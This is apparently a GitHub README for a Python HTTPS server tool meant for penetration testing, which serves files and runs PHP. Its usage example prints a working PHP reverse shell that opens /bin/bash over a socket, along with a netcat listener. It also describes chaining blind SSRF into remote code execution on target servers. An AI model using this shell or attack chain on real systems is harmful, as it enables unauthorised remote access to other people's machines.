# rogue-https-server.py
Rogue HTTPS Server is a tool that allows you to create a Python 3.10/3.11 HTTPS/SSL server to receive encrypted connections, serve content, and run PHP scripts.

![1-photo](https://github.com/ajacobhack/rogue-https-server/assets/99199970/79a9f034-23a8-4853-bd9e-d4a245464b92)


Rogue HTTPS Server is a powerful and easy-to-use tool that allows you to create an HTTPS/SSL server with TLS in Python 3.10/3.11, primarily intended for ethical hacking tests that require a server with encrypted connections that may be able to connect to applications websites strictly configured for HTTPS traffic. It provides additional options such as assigning a free DNS to the specified IP address, automatic pem certificate creation, static server, and PHP file execution.

### **Characteristics**

- **HTTPS/SSL Server**: Creates a TCP/IP server at the specified IP address and port to listen for HTTPS/SSL connections, including 443.
- **Free DNS Support**: Assign a free subdomain to the IP address using DuckDNS to access your server more conveniently.
- **PHP code execution**: Executes PHP code on the server to perform dynamic and custom actions in your web applications.
- **Static File Management**: Serve static files, such as HTML, CSS, JavaScript, images and more, to display content on your server.

## Use

1. Clone the Rogue HTTPS Server repository to your local machine.
    
     ```
     git clone https://github.com/ajacobhack/rogue-https-server.git
     ```
    
2. Navigate to the project directory: `cd rogue-https-server`.
3. Optional: If you want to assign free DNS using DuckDNS, make sure you have a DuckDNS subdomain and token.
4. Run the server using the following command:
    
     ```bash
     python3 rogue-https-server.py -i <IP_ADDRESS> -p <PORT> -s <SUBDOMAIN> -t <DUCKDNS_TOKEN>
     ```
    
     - `<IP_ADDRESS>`: The IP address on which you want the server to listen for incoming connections.
     - `<PORT>`: The port on which you want the server to listen for incoming connections.
     - `<SUBDOMAIN>` (optional): The subdomain you want to assign for free DNS using DuckDNS.
     - `<DUCKDNS_TOKEN>` (optional): The DuckDNS token needed to assign the subdomain.
5. The server will start listening for incoming connections on the specified IP address and port. If a DuckDNS subdomain and token is provided, the free DNS will be assigned using DuckDNS for the specified subdomain.
6. When an HTTP/HTTPS request is received, the server will respond as follows:
- If the request corresponds to an existing PHP file, the PHP code will be executed and the output will be sent to the client.
- If the request corresponds to an existing static file (HTML, CSS, JS, images, etc.), the content of the file will be sent to the client.
- If the request does not correspond to any existing file, a "404 Not Found" error response will be sent to the client.
- 
![2023-06-05 16_50_16-Window](https://github.com/ajacobhack/rogue-https-server/assets/99199970/666c0bad-b23a-4ad6-a119-ac43246620b6)

![2023-06-05 16_51_54-Window](https://github.com/ajacobhack/rogue-https-server/assets/99199970/a37a014d-e92b-4d76-adac-a4d6bb0db105)

![2023-06-05 16_52_31-Window](https://github.com/ajacobhack/rogue-https-server/assets/99199970/e02c0e42-060d-4bfb-920e-9d285b10718b)


## Additional features

- **Automatic generation of PEM files**: If the server does not find the `cert.pem` and `key.pem` files in the working directory, it will automatically generate these files using OpenSSL.
- **Optional Free DNS Configuration**: You can provide a DuckDNS subdomain and token to assign free DNS using DuckDNS. This setting is optional and you can skip it if you don't want to use this functionality.

### **Example of use**

Suppose we want to run PHP code on the server and get an interactive shell connection to the server. Here is an example of how it can be achieved using the server:

1. Run the server at IP address **`127.0.0.1`** and port `443`:
    
     ```bash
     python3 rogue-https-server.py -i 127.0.0.1 -p 443
     ```
    
2. Create a PHP file with the following content and save it as **`shell.php`**:
    
     ```php
     <?php
     $sock = fsockopen("127.0.0.1", 4242); /*CHANGE IP and PORT*/
     $descriptors = array(
         0 => $sock,
         1 => $sock,
         2 => $sock
     );
     $process = proc_open('/bin/bash -i', $descriptors, $pipes);
     ?>
     ```
    
3. Open your web browser and visit **`https://127.0.0.1:443/shell.php`**.
4. In a separate terminal session, start a netcat server to listen on port **`4242`**:
    
     ```bash
     nc -lnvp 4242
     ```
    
5. When you access **`https://127.0.0.1:443/shell.php`** in your browser, the server will execute the PHP code and open a shell connection in the netcat session.

![shell php con exit](https://github.com/ajacobhack/rogue-https-server/assets/99199970/57864150-711f-405e-bc91-fbfbab172a6e)

### Vulnerabilities that help identify and check:
- Security Misconfiguration: target server connects via https to external servers with self-signed certificates, or without dns.
- External Service Interaction (DNS and HTTP): the target server/application can, due to bad configuration, request resources externally through https and previous DNS resolution to any external server, in this case ours.
- Blind SSRF on the target server, which manages to connect via Out-Of-Band to our https server with dns, which could chain execute requests to internal resources.
- RCE PHP: if the target server or application can request resources from our server, they could execute a reverse PHP shell served by our server, achieving remote code execution.

### **Contribution**

We welcome your contributions to Rogue HTTPS Server! If you encounter any issues, have an idea for improvement, or want to add new features, feel free to open an issue or submit a pull request on the official repository.

### **License**

This project currently does not have an open license.

### **Contact**

If you have any questions or suggestions, feel free to contact our team. You can email us at **[info@roguehttpsserver.com](mailto:info@roguehttpsserver.com)** or join our community on the Discord channel **[Rogue HTTPS Server Community](https://discord .gg/roguehttpsserver)**. We look forward to helping you!

### **Thanks**

I want to thank the community of developers and contributors who have made this project possible. Your contributions and feedback have been instrumental in improving Rogue HTTPS Server and providing a useful and reliable tool.

### **Legal warning**

Rogue HTTPS Server is a tool designed to be used for development and ethical purposes only. We are not responsible for any misuse of this tool. Make sure to comply with local laws and regulations when using Rogue HTTPS Server.
